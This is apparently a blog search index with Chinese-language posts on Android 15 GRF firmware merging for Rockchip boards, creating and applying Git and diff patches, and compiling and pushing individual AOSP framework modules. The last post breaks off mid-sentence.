<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Android 15 的GRF平台开发说明</title>
      <link href="/2025/08/10/2025-08-10/"/>
      <url>/2025/08/10/2025-08-10/</url>
      
        <content type="html"><![CDATA[<h1 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h1><p>Android GRF 估计很多人不清楚是啥，这个我也是开发Android15源码才知道的。</p><p>简单的说就是Android15的系统可以用Android14的开发板进行适配开发。</p><p>系统开发人员后面估计都会遇到，有兴趣的可以了解看看。</p><p>不同系统编译的脚本和命令，在不同SOC厂商可能是不同的，<br>这里不展开说明，大概有个了解就好了。</p><h3 id="1、GRF-Google-Requirements-Freeze（谷歌需求冻结）"><a href="#1、GRF-Google-Requirements-Freeze（谷歌需求冻结）" class="headerlink" title="1、GRF: Google Requirements Freeze（谷歌需求冻结）,"></a>1、GRF: Google Requirements Freeze（谷歌需求冻结）,</h3><ol><li>是Google（操作系统）与SoC（System on Chip系统芯片）厂商的一种合作方式，</li><li>SoC在某个Android版本进行Freeze（冻结）之后，</li><li>连续4个Android版本不需要再升级vendor组件，以加快系统版本的适配和升级。</li><li>加入GRF的SoC，必须保证4个大版本Android的升级。</li><li>这种合作模式，对于IDH和ODM/OEM厂商也有很大的益处，</li><li>对于硬件改动小的板形，配合使用A14的SDK，即可快速完成对Android 15/16/17的适配。</li></ol><h3 id="2、Merge（系统固件合并）"><a href="#2、Merge（系统固件合并）" class="headerlink" title="2、Merge（系统固件合并）:"></a>2、Merge（系统固件合并）:</h3><ol><li>对于GRF的芯片，必须按照要求，使用GRF的SDK，编译出BSP以及Vendor相关的组件；</li><li>而需要过认证的版本（例如A15），则需要编译出Frameworks、App相关的组件。</li><li>两部分编译完成，进行合并操作，</li><li>生成完整的固件（<strong>这里的固件并非临时固件，就是最终测试、量产的固件</strong>），测试功能以及GMS等。</li></ol><h3 id="3、Android14-GRF-支持的版本平台"><a href="#3、Android14-GRF-支持的版本平台" class="headerlink" title="3、Android14 GRF 支持的版本平台"></a>3、Android14 GRF 支持的版本平台</h3><table><thead><tr><th>平台/认证版本</th><th>GRF版本</th><th>Android 15</th><th>Android 16</th><th>Android 17</th></tr></thead><tbody><tr><td>RK33XX</td><td>14</td><td>Y</td><td>Y</td><td>Y</td></tr><tr><td>RK3588</td><td>14</td><td>Y</td><td>Y</td><td>Y</td></tr><tr><td>RK35XX</td><td>14</td><td>Y</td><td>Y</td><td>Y</td></tr></tbody></table><h3 id="4、先不涉及代码修改，这里简单总结一下GRF："><a href="#4、先不涉及代码修改，这里简单总结一下GRF：" class="headerlink" title="4、先不涉及代码修改，这里简单总结一下GRF："></a>4、先不涉及代码修改，这里简单总结一下GRF：</h3><ol><li>GRF ，Google Requirements Freeze 表示谷歌需求冻结<blockquote><p>某一个部分的需求冻结，后期改动会较小不影响正常使用；<br>比如Android14-17底层内核和vendor逻辑基本不变；<br>只需要适配Frameworks、APP、System 等固件即可使用最新版本的Android系统。</p></blockquote></li><li>下载一个GRF的源码，后续四个系统版本都可以用这个开发板进行升级</li></ol><p>简单的说就是<strong>Google后面会减少内核或硬件上的适配修改</strong>，主要适配上层逻辑，可以不用换新的硬件升级新的系统了。</p><h1 id="二、Android15-GRF-代码适配"><a href="#二、Android15-GRF-代码适配" class="headerlink" title="二、Android15 GRF 代码适配"></a>二、Android15 GRF 代码适配</h1><h3 id="1、重新下载一份Android15-的GRF-系统代码"><a href="#1、重新下载一份Android15-的GRF-系统代码" class="headerlink" title="1、重新下载一份Android15 的GRF 系统代码"></a>1、重新下载一份Android15 的GRF 系统代码</h3><p>注意Android15 GRF的源码会下载两套代码，一套是Android14 U的，一套是Android15 V的；</p><h3 id="2、GMS代码配置"><a href="#2、GMS代码配置" class="headerlink" title="2、GMS代码配置"></a>2、GMS代码配置</h3><p>GMS相关配置，请参考GMS配置文档(Android_GMS_Developer_Guide)进行配置。</p><ol><li>除了GMS的基本配置外，需要额外做一些配置以使GMS固件适配GRF。</li><li>GMS 即谷歌移动服务（Google Mobile Service） ，是谷歌旗下的一项服务，</li><li>让用户能通过移动设备使用谷歌搜索、谷歌地图、Gmail、YouTube 等产品。</li></ol><p>GMS 一般比较少适配，大部分情况都是厂商适配完成后我们使用就行。</p><h3 id="3、对于GRF-SDK"><a href="#3、对于GRF-SDK" class="headerlink" title="3、对于GRF SDK"></a>3、对于GRF SDK</h3><p>编译固件前，需要确认你要做的认证版本，配置api，<br>以Android 15 + GRF 14为例，在GRF SDK (Android 14)中，增加以下修改：</p><p>不同平台的修改会不一样，这里举例3588的修改：</p><p>在Android14 u的源码目录：rk3588_u.mk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># First lunching is U, api_level is 34</span><br><span class="line">-PRODUCT_SHIPPING_API_LEVEL := 34</span><br><span class="line">+PRODUCT_SHIPPING_API_LEVEL := 35</span><br></pre></td></tr></table></figure><h3 id="4、对于认证SDK"><a href="#4、对于认证SDK" class="headerlink" title="4、对于认证SDK"></a>4、对于认证SDK</h3><p>编译固件前，需要确认GRF的版本是否需要VNDK，如果需要VNDK，则要求增加vndk适配包。<br>从AOSP 15开始，VNDK移除。<br>因此，只要GRF在15以前的版本，都需要增加vndk适配包，<br><strong>注意这里不要修改PRODUCT_SHIPPING_API_LEVEL</strong>，在认证SDK（此处以Android 15为例）中，补丁如下：</p><p>在Android15 v的源码目录：rk3588_u.mk：rk3588_u.mk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-# First lunching is U, api_level is 34</span><br><span class="line">+# Add VNDK support for GRF Vendor API Freeze A14</span><br><span class="line">+PRODUCT_EXTRA_VNDK_VERSIONS := 34</span><br><span class="line">+</span><br><span class="line">+# First lunching is A14, api_level is 34</span><br><span class="line"> PRODUCT_SHIPPING_API_LEVEL := 34</span><br><span class="line"> PRODUCT_DTBO_TEMPLATE := $(LOCAL_PATH)/dt-overlay.in</span><br></pre></td></tr></table></figure><p>对于 PRODUCT_SHIPPING_API_LEVEL 标签，Android13之前的方案也是有的，<br>但是可能作用并未定义使用，而且不是对标Android系统版本。<br>也有可以是rk芯片厂商的做法，其他厂商还未开发Android15，不确定具体情况。</p><p>从上面SDK和认证版本大概可以得知：</p><ol><li>GRF SDK 是需要修改的 Android14 U源码的目录；</li><li>认证 SDK 是需要修改的 Android15 V源码的目录；</li></ol><p>Android13 以后销售国外产品是必须走认证的，否则可能会被封杀。</p><h3 id="5、编译说明"><a href="#5、编译说明" class="headerlink" title="5、编译说明"></a>5、编译说明</h3><p>厂商提供了一个用于管理GRF SDK的管理工具，使用脚本工具时，<br>通过简单配置，可以最大程度的简化编译、合并等步骤。<br>推荐使用管理工具进行编译、合并、打包等。</p><h4 id="（1）编译前准备"><a href="#（1）编译前准备" class="headerlink" title="（1）编译前准备"></a>（1）编译前准备</h4><p>需要分别下载GRF SDK和SYSTEM SDK，以当前A15 (GRF 14版本) 过认证为例，<br>需要下载GRF SDK (Android 14) 以及SYSTEM SDK (Android 15)。</p><p>代码结构如下：<br><img src="/images/20250810/20250810001.png"></p><p>最终理想情况如下：</p><p><img src="/images/20250810/20250810002.png"></p><p>不管怎么样，最终就是要两个SKD合并成一个升级固件。</p><h4 id="（2）使用SDK管理脚本工具"><a href="#（2）使用SDK管理脚本工具" class="headerlink" title="（2）使用SDK管理脚本工具"></a>（2）使用SDK管理脚本工具</h4><ul><li><p>配置SDK</p></li><li><p>lunch产品</p></li><li><p>配置json文件</p></li><li><p>check配置</p><blockquote><p>此功能为GMS专用，初步检查GMS认证相关的配置，是否符合CDD/VSR/GMS Requirements。</p></blockquote></li><li><p>build编译固件</p><blockquote><p>编译SDK组件，选择system时，编译frameworks及app组件，GMS包也属于此部分。</p></blockquote></li><li><p>install，只拷贝、合并、打包。</p><blockquote><p>执行此命令，会将前面编译好的vendor素材包及frameworks素材包拷贝到Rockdev中，同时进行merge、pack。</p></blockquote></li><li><p>merge合并vendor和frameworks</p><blockquote><p>执行此命令，会将前面编译好的vendor素材包及frameworks素材包进行合并，生成新的素材包及fastboot可烧写的固件包以及super.img。但不会生成update.img大固件。</p></blockquote></li><li><p>pack</p><blockquote><p>执行此命令，会将前面编译好的固件包打包成update.img大固件。如果环境变量中存在USE_OVERLAY=1，则会在打包update.img前，从overlay目录拷贝覆盖image。</p></blockquote></li><li><p>distclean</p><blockquote><p>执行此命令，会删除Rockdev以及SYSTEM_SDK和VENDOR_SDK的out/dist目录。</p></blockquote></li><li><p>reset</p><blockquote><p>清除SYSTEM_SDK和VENDOR_SDK的软链接以及配置文件config.json</p></blockquote></li></ul><h4 id="（3）不使用SDK管理脚本工具"><a href="#（3）不使用SDK管理脚本工具" class="headerlink" title="（3）不使用SDK管理脚本工具"></a>（3）不使用SDK管理脚本工具</h4><ul><li><p>在GRF版本SDK中编译固件</p><blockquote><p>确保此GRF版本SDK（例如Android 14）固件的基本功能正常，稳定性没有问题。确认OK后，编译素材包：</p></blockquote></li><li><p>在认证版本SDK中编译固件</p><blockquote><p>确保此认证版本SDK（例如Android 15）固件的基本功能正常，稳定性没有问题，注意分区表要和GRF版本一致，硬件相关功能配置也要完全一致。确认OK后，编译素材包：</p></blockquote></li><li><p>合并素材包，生成新固件</p><blockquote><p>合并步骤，需要在当前过认证的版本SDK中进行。例如A15 + GRF 14，我们需要在A15中编译出需要用到的工具，并使用此工具合并两个素材包。<br>合并素材包时，需要指定组合方式，分别传入frameworks（这里指当前过认证的版本，如Android 15）和vendor（这里指GRF初始版本，如Android 14）的素材包，执行命令，即可生成新的素材包及fastboot可烧写的镜像。</p></blockquote></li></ul><p>执行结束后，产生fastboot可烧写的zip固件，以及合并后的素材包。包含<code>--output-super out_merged1/super.img</code>参数时会同时生成super.img，方便做大固件烧写。例如上述命令执行后，得到：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">205@^_^@ | out_merged1 ls</span><br><span class="line">rk3588_u-img.zip  rk3588_u-target_files-0001.zip  super.img</span><br></pre></td></tr></table></figure><h3 id="三、烧写升级"><a href="#三、烧写升级" class="headerlink" title="三、烧写升级"></a>三、烧写升级</h3><p>使用RK烧写工具</p><p>客户可以按照需求自行选择烧写大固件或散包：</p><ul><li><p>如果使用SDK管理工具，执行打包命令后，</p><blockquote><p>会生成update.img大固件，直接加载大固件烧写即可。</p></blockquote></li><li><p>如果不使用SDK管理工具，请自己烧写散包。</p><blockquote><p>解压fastboot包即可得到各个分区的镜像，需要自己导入分区表。<br>动态分区(odm/odm_dlkm/product/system/system_dlkm/system_ext/vendor/vendor_dlkm)的镜像不需要导入分区表，<br>对应的super.img在执行命令后会同步生成。</p></blockquote></li><li><p>或拷贝散包镜像自己打包update.img大固件，再进行烧写。</p></li></ul><p>无论是编译还是烧写，不同的SOC厂商都是有差异的，这里是参考RK的。</p><h3 id="四、附录"><a href="#四、附录" class="headerlink" title="四、附录"></a>四、附录</h3><p>1、生成镜像以及对应关系</p><table><thead><tr><th>镜像</th><th>从哪个素材包生成</th></tr></thead><tbody><tr><td>boot.img</td><td>vendor</td></tr><tr><td>dtbo.img</td><td>vendor</td></tr><tr><td>init_boot.img</td><td>vendor</td></tr><tr><td>odm.img</td><td>vendor</td></tr><tr><td>odm_dlkm.img</td><td>vendor</td></tr><tr><td>product.img</td><td>frameworks</td></tr><tr><td>resource.img</td><td>vendor</td></tr><tr><td>system.img</td><td>frameworks</td></tr><tr><td>system_dlkm.img</td><td>vendor</td></tr><tr><td>system_ext.img</td><td>frameworks</td></tr><tr><td>uboot.img</td><td>vendor</td></tr><tr><td>vbmeta.img</td><td>由新镜像重新签名生成</td></tr><tr><td>vendor.img</td><td>vendor</td></tr><tr><td>vendor_boot.img</td><td>vendor</td></tr><tr><td>vendor_dlkm.img</td><td>vendor</td></tr></tbody></table><h3 id="2、源码位置-——-VENDOR-SDK部分"><a href="#2、源码位置-——-VENDOR-SDK部分" class="headerlink" title="2、源码位置 —— VENDOR_SDK部分"></a>2、源码位置 —— VENDOR_SDK部分</h3><p>VENDOR部分代码都位于VENDOR_SDK目录中，主要包含所有BSP相关的内容。例如loader、uboot、Android HAL、驱动等。</p><p>编译时可使用 <strong>./merge_unity.sh build vendor</strong> 编译，如需调试、单独编译某个so或bin，则需要像之前一样，在VENDOR_SDK中 <strong>source build/envsetup.sh ; lunch</strong> ，选择你的product后，使用m 模块名进行编译。</p><table><thead><tr><th>源码仓库</th><th>备注</th></tr></thead><tbody><tr><td>u-boot/rkbin</td><td>到VENDOR_SDK中编译</td></tr><tr><td>kernel</td><td>到VENDOR_SDK中编译</td></tr><tr><td>mkcombinedroot</td><td>编译kernel时自动更新ko</td></tr><tr><td>hardware/*</td><td>可在VENDOR_SDK中单独编译某个组件</td></tr><tr><td>vendor/rockchip/*</td><td>可在VENDOR_SDK中单独编译某个组件</td></tr><tr><td>vendor/widevine</td><td>可在VENDOR_SDK中单独编译某个组件</td></tr><tr><td>bootable/*</td><td>可在VENDOR_SDK中单独编译某个组件</td></tr><tr><td>device/*</td><td>配置需要和SYSTEM_SDK一致</td></tr><tr><td>external/camera_engine_rkaiq</td><td>可在VENDOR_SDK中单独编译某个组件</td></tr><tr><td>external/uvc-gadget</td><td>可在VENDOR_SDK中单独编译某个组件</td></tr></tbody></table><h3 id="3、源码位置-——-SYSTEM-SDK部分"><a href="#3、源码位置-——-SYSTEM-SDK部分" class="headerlink" title="3、源码位置 —— SYSTEM_SDK部分"></a>3、源码位置 —— SYSTEM_SDK部分</h3><p>SYSTEM部分代码都位于SYSTEM_SDK目录中，编译时可使用 <strong>./merge_unity.sh build system</strong> 编译，如需调试、单独编译某个so或bin，则需要像之前一样，在SYSTEM_SDK中 <strong>source build/envsetup.sh</strong> ; lunch，选择你的product后，使用m 模块名进行编译。</p><table><thead><tr><th>源码仓库</th><th>备注</th></tr></thead><tbody><tr><td>frameworks</td><td>到SYSTEM_SDK中编译</td></tr><tr><td>packages</td><td>到SYSTEM_SDK中编译</td></tr><tr><td>system</td><td>到SYSTEM_SDK中编译</td></tr><tr><td>vendor/gms_express</td><td>RK提供的，符合GMS Express Plus要求</td></tr><tr><td>vendor/partner_gms</td><td>原生Google GMS包</td></tr><tr><td>vendor/partner_modules</td><td>原生Google GMS包</td></tr><tr><td>vendor/rockchip/platform</td><td>可在VENDOR_SDK中单独编译某个组件</td></tr></tbody></table><h1 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h1><h3 id="1、GRF小结"><a href="#1、GRF小结" class="headerlink" title="1、GRF小结"></a>1、GRF小结</h3><p>Android 14 后，可以下载一个GRF版本，<br>理论上支持后续四个版本的系统升级在同一个开发板上。</p><p>比如下载 Android14 版本的GRF代码，加上Android15 的代码，编译后就是Android15 的系统代码。<br>简单理解就是用Android14 的底层+Android15 SDK的上层。</p><p>当然也可以下载Android15 的GRF版本，<br>下载Android16、17 的源码，也是可以用同一个开发板。</p><p>其实也是类似手机的升级，,在线升级后，<br>发现从Android11 升级到了 Android12，也有可能有的是有硬件限制无法升级的情况。</p><h3 id="2、Android-GRF-起源"><a href="#2、Android-GRF-起源" class="headerlink" title="2、Android GRF 起源"></a>2、Android GRF 起源</h3><p>搜索看了下，GRF并不是Android14才有的，之前就有了。</p><p>Android GRF（Google Requirements Freeze）即谷歌需求冻结，是谷歌于 2020 年推出的一项策略。</p><h4 id="1-过程"><a href="#1-过程" class="headerlink" title="(1) 过程:"></a>(1) 过程:</h4><blockquote><p>Project Treble 的不足：谷歌在 2017 年的 Android 8 时代推出了 Project Treble，<br>其将 Android 的供应商支持框架（Vendor）与 Android 本体解耦，<br>解除了驱动与系统版本的 “挂钩” 机制，但没有从根本上解决 Android 生态的碎片化问题，<br>还增加了芯片厂商维护多种 Vendor 版本的工作量。</p></blockquote><blockquote><p>Android 11 起实施该策略后，Vendor 版本被冻结，<br>谷歌承诺为各 Vendor 版本提供 N+3 的特性向后兼容。<br>比如骁龙 888 的 Vendor 版本适配 Android 11，<br>谷歌会保证在 Android 14 时，该 Vendor 版本仍能启动并通过兼容性测试。</p></blockquote><p>虽然Android8有这个思路，但是真正实行是Android11；<br>但是也未大范围推广，估计Android14之后的版本会更多推广。</p><h4 id="2-减少开发复杂性"><a href="#2-减少开发复杂性" class="headerlink" title="(2) 减少开发复杂性"></a>(2) 减少开发复杂性</h4><p>通过需求冻结提供更稳定和可预测的软件开发环境，帮助设备制造商提前规划并优化他们的资源，<br>减少开发复杂性，加快产品上市速度，并提高最终产品的质量和用户体验。</p><h4 id="3-影响"><a href="#3-影响" class="headerlink" title="(3) 影响"></a>(3) 影响</h4><p>积极方面：对于芯片厂商来说，显著降低了其工程成本。<br>消极方面：谷歌必须保证 Android 新版本与先前 Vendor 版本的兼容性，<br>难以做到涉及硬件支持的特性在相同版本 Android 上体验一致。</p><p>此文转载自<a href="https://blog.csdn.net/wenzhi20102321/article/details/145965282">CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git Commit 生成与合入 Patch 指南</title>
      <link href="/2025/07/06/2025-07-06/"/>
      <url>/2025/07/06/2025-07-06/</url>
      
        <content type="html"><![CDATA[<h2 id="1-生成-Patch-文件"><a href="#1-生成-Patch-文件" class="headerlink" title="1. 生成 Patch 文件"></a>1. 生成 Patch 文件</h2><h3 id="1-1-使用-Diff-命令生成-Patch"><a href="#1-1-使用-Diff-命令生成-Patch" class="headerlink" title="1.1 使用 Diff 命令生成 Patch"></a>1.1 使用 Diff 命令生成 Patch</h3><p>通过 <code>diff</code> 命令，可以为两个目录生成差异补丁，这对于文件夹内文件的修改非常有用，可以生成一个包含所有修改操作的补丁文件。^[3]^</p><p><strong>前提条件</strong>:</p><ul><li>需要对比的两个目录的顶层路径深度需一致。^[4]^若不一致，建议使用软链接来满足此要求。^[5]^</li></ul><p><strong>示例</strong>:<br>假设有两个目录：</p><ul><li>目录1：<code>/media/data2/quectel/r12/cn_kj_r12a07/ql-ol-kernel/</code></li><li>目录2：<code>/tmp/sdk/cn_kj_r12a07/ql-ol-kernel/</code></li></ul><p>可以通过以下命令创建软链接并生成补丁：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> patch</span><br><span class="line"><span class="built_in">ln</span> -s /media/data2/quectel/r12/cn_kj_r12a07/ql-ol-kernel/ patch/new </span><br><span class="line"><span class="built_in">ln</span> -s /tmp/sdk/cn_kj_r12a07/ql-ol-kernel/ patch/old</span><br></pre></td></tr></table></figure><p>若只修改了部分目录（如 arch/arm/boot/dts/qcom，drivers，sound），则只需对比这些路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> patch </span><br><span class="line">diff -Naur old/arch/arm/boot/dts/qcom new/arch/arm/boot/dts/qcom &gt; gpio-export.diff</span><br><span class="line">diff -Naur old/drivers new/drivers &gt;&gt; gpio-export.diff</span><br><span class="line">diff -Naur old/sound new/sound &gt;&gt; gpio-export.diff</span><br></pre></td></tr></table></figure><p>参数说明:</p><ul><li>-N: 将不存在的文件视为空文件。</li><li>-a: 将所有文件视为文本文件处理。</li><li>-u: 输出差异时附带差异前后三行的内容。</li><li>-r: 递归比较所有子目录。</li></ul><p>注意:</p><ul><li>确保生成的补丁中，对比文件路径的顶层路径一致，以便合并时能正确找到对应文件。</li></ul><h3 id="1-2-使用-Git-Format-Patch-生成-Patch"><a href="#1-2-使用-Git-Format-Patch-生成-Patch" class="headerlink" title="1.2 使用 Git Format-Patch 生成 Patch"></a>1.2 使用 Git Format-Patch 生成 Patch</h3><p>在 Git 中，可以使用 git format-patch 命令生成特定 commit 的补丁文件。</p><p><strong>步骤:</strong></p><ol><li>确保已提交想要生成补丁的 commit。</li><li>使用 git format-patch 命令生成补丁文件。</li></ol><p><strong>示例:</strong></p><ul><li>生成最新提交的补丁：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git format-patch -1 HEAD</span><br></pre></td></tr></table></figure><ul><li>为特定 commit 生成补丁：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git format-patch -1 &lt;commit-hash&gt;</span><br></pre></td></tr></table></figure><ul><li>为一系列 commits 生成补丁：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git format-patch &lt;commit-hash1&gt;..&lt;commit-hash2&gt;</span><br></pre></td></tr></table></figure><p><strong>常用命令:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git format-patch HEAD^ <span class="comment"># 生成最近的1次commit的patch</span></span><br><span class="line">$ git format-patch HEAD^^ <span class="comment"># 生成最近的2次commit的patch</span></span><br><span class="line">$ git format-patch HEAD^^^ <span class="comment"># 生成最近的3次commit的patch</span></span><br><span class="line">$ git format-patch &lt;r1&gt;..&lt;r2&gt; <span class="comment"># 生成两个commit间的修改的patch</span></span><br><span class="line">$ git format-patch -1 &lt;r1&gt; <span class="comment"># 生成单个commit的patch</span></span><br><span class="line">$ git format-patch --root &lt;r1&gt; <span class="comment"># 生成从根到r1提交的所有patch</span></span><br></pre></td></tr></table></figure><h2 id="2-合入-Patch-文件"><a href="#2-合入-Patch-文件" class="headerlink" title="2. 合入 Patch 文件"></a>2. 合入 Patch 文件</h2><h3 id="2-1-使用-Patch-命令合入"><a href="#2-1-使用-Patch-命令合入" class="headerlink" title="2.1 使用 Patch 命令合入"></a>2.1 使用 Patch 命令合入</h3><p>将生成的 .diff 或 .patch 文件复制到目标目录，然后使用 patch 命令合入。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> gpio-export.diff /tmp/sdk/cn_kj_r12a07/ql-ol-kernel/</span><br><span class="line">patch -p1 &lt; gpio-export.diff</span><br></pre></td></tr></table></figure><p><strong>参数说明:</strong></p><ul><li>-p1: 合入时忽略第一层目录。例如，.diff 文件中的 new/sound/soc/soc-jack.c 路径，查找时会忽略 new/ 前缀。</li><li>-pn: 忽略 n 层目录。</li></ul><p><strong>撤销补丁:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patch -p1 -RE &lt; /media/data2/quectel/r12/patch/gpio-export.diff</span><br></pre></td></tr></table></figure><p><strong>参数说明:</strong></p><ul><li>-R: 还原修改，即撤销合入的补丁。</li><li>-E: 删除合入补丁后的空文件。</li></ul><p>通过以上步骤，您可以轻松地生成并合入 Git commit 的 patch 文件，从而方便地进行代码的审查和合并。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android系统模块编译调试与Ninja使用指南</title>
      <link href="/2025/06/29/2025-06-29/"/>
      <url>/2025/06/29/2025-06-29/</url>
      
        <content type="html"><![CDATA[<h2 id="模块编译调试方法"><a href="#模块编译调试方法" class="headerlink" title="模块编译调试方法"></a>模块编译调试方法</h2><p>(此处举例framework、installd、SystemUI等模块的编译调试，其他类似)</p><h3 id="1-Framework模块编译"><a href="#1-Framework模块编译" class="headerlink" title="1. Framework模块编译"></a>1. Framework模块编译</h3><p>Android系统代码的framework目录内，一共有3个模块单独编译：framework、services、framework-res.apk。</p><p><strong>注意</strong>：偶尔会有改了代码但没检测到，编译结束后产物并未更新的情况，所以可以考虑先剪切掉原先的产物或者检查产物更新时间确保已经重新编译。</p><p><strong>步骤</strong>：</p><ol><li>完成根目录下 <code>source build/envsetup.sh</code> 命令、<code>lunch qssi-userdebug-mars</code> 命令（准备好编译环境、选择好编译分支，才可以开始编译）。</li><li>整编命令如 <code>bash build.sh -j32 dist --qssi_only 2&gt;&amp;1 | tee buildlog.log</code>。</li></ol><h4 id="1-1-修改frameworks-base-core-res下的内容"><a href="#1-1-修改frameworks-base-core-res下的内容" class="headerlink" title="1.1 修改frameworks/base/core/res下的内容"></a>1.1 修改frameworks/base/core/res下的内容</h4><ul><li>在执行 <code>source build/envsetup.sh</code> 命令的版本源代码根目录执行 <code>make framework-res -j32</code>。</li><li>产物位于 <code>out/target/product/qssi/system/framework</code> 下面（如 <code>framework-res.apk</code> 之类），push到手机的 <code>/system/framework/</code> 下面重启即可。</li></ul><h4 id="1-2-修改framework-base-services下的内容"><a href="#1-2-修改framework-base-services下的内容" class="headerlink" title="1.2 修改framework/base/services下的内容"></a>1.2 修改framework/base/services下的内容</h4><ul><li>在执行 <code>source build/envsetup.sh</code> 命令的版本源代码根目录执行 <code>make services -j32</code>。</li><li>产物位于 <code>out/target/product/qssi/system/framework</code> 下面，拿出来push到手机的 <code>/system/framework/</code> 下面重启即可。</li></ul><h4 id="1-3-修改framework-base-core下的内容"><a href="#1-3-修改framework-base-core下的内容" class="headerlink" title="1.3 修改framework/base/core下的内容"></a>1.3 修改framework/base/core下的内容</h4><ul><li>在执行 <code>source build/envsetup.sh</code> 命令的版本源代码根目录执行 <code>make framework-minus-apex -j32</code>。</li><li>产物位于 <code>out/target/product/qssi/system/framework</code> 下面，拿出来push到手机的 <code>/system/framework/</code> 下面重启即可。</li><li><strong>问题处理</strong>：如果卡在开机过程里（常在小于Android13版本中发生），而且不是自己原因导致而是一些AndroidRuntime错误导致的signal 6的内存错误，可尝试在push <code>framework.jar</code> 后 <code>adb shell rm -rf system/framework/oat system/framework/arm system/framework/arm64</code> 再重启。</li></ul><h4 id="1-4-其他目录下的代码修改"><a href="#1-4-其他目录下的代码修改" class="headerlink" title="1.4 其他目录下的代码修改"></a>1.4 其他目录下的代码修改</h4><ul><li>在framework/base下的其他很多目录下的代码修改也可以被编译到，但需要自行确认：<ul><li>故意改错去编译。</li><li>搜Android.bp文件内容看看framework-minus-apex library的srcs是否包含了被修改的文件。</li></ul></li></ul><h4 id="1-5-作SDK"><a href="#1-5-作SDK" class="headerlink" title="1.5 作SDK"></a>1.5 作SDK</h4><ul><li>如果是要make出jar包给apk调用而不是push到系统里调试，那要拿此目录的jar包：<code>out/target/common/obj/JAVA_LIBRARIES/framework-minus-apex_intermediates/classes.jar</code>。</li><li><strong>版本改动注意</strong>：在Android11之前修改了framework相关代码，只需 <code>make framework</code> 就可以编译出 <code>framework.jar</code>。在Android11，这个编译命令不起作用了，根据framework/base/目录下Android.bp中的提示，编译命令需要改为 <code>make framework-minus-apex</code>。</li></ul><h3 id="2-修改frameworks-native-cmds-abcd的任意模块代码"><a href="#2-修改frameworks-native-cmds-abcd的任意模块代码" class="headerlink" title="2. 修改frameworks/native/cmds/abcd的任意模块代码"></a>2. 修改frameworks/native/cmds/abcd的任意模块代码</h3><ul><li>通过 <code>make abcd -j32</code> 编译，比如 <code>make installd -j16</code> <code>make atrace -j16</code> 等。</li><li>产物位于 <code>out/target/product/qssi/system/bin</code> 下面，拿出来push到手机的 <code>/system/bin/</code> 下面重启即可。</li></ul><h3 id="3-修改packages-modules-abcd的代码"><a href="#3-修改packages-modules-abcd的代码" class="headerlink" title="3. 修改packages/modules/abcd的代码"></a>3. 修改packages/modules/abcd的代码</h3><ul><li>通过找被修改文件属于的同/上级目录的Android.bp文件中哪个模块内编译，在此模块library中找到apex_available标签，即标识该library可以被name为xxxx的apex包进去，通过 <code>make xxxx -j32</code> 编译。</li><li>产物位于 <code>out/target/product/qssi/system/apex/</code> 下面，拿出来push到手机的 <code>/system/apex/</code> 下面重启即可。</li><li><strong>示例</strong>：修改了 <code>/packages/modules/Wifi/framework/java/android/net/wifi/WifiManager.java</code>，那么在 <code>/packages/modules/Wifi/framework/Android.bp</code> 中找到 <code>apex_available: [&quot;com.android.wifi&quot;, &quot;test_com.android.wifi&quot;]</code>，就知道 <code>make com.android.wifi -j16</code> 可以编译到被修改文件。</li></ul><h3 id="4-改动SystemUI、Settings等模块的代码"><a href="#4-改动SystemUI、Settings等模块的代码" class="headerlink" title="4. 改动SystemUI、Settings等模块的代码"></a>4. 改动SystemUI、Settings等模块的代码</h3><ul><li>可以通过 <code>make SystemUI</code>、<code>make Settings</code> 来进行编译，产物在 <code>/system/app</code> 或 <code>/system/priv-app</code> 下面，将结果apk直接install，然后重启此应用相关服务，如直接重启手机，或者如SystemUI在install后 <code>adb shell am restart</code> 也可以。</li><li><strong>注意</strong>：不要push已经存在的apk到手机，重启系统不会扫描，新的apk不会重新安装，测试效果将还是原先的效果，除非此系统apk可以先删掉重启再push再重启。</li></ul><h3 id="5-通用编译模块的方法"><a href="#5-通用编译模块的方法" class="headerlink" title="5. 通用编译模块的方法"></a>5. 通用编译模块的方法</h3><ul><li>如修改位于 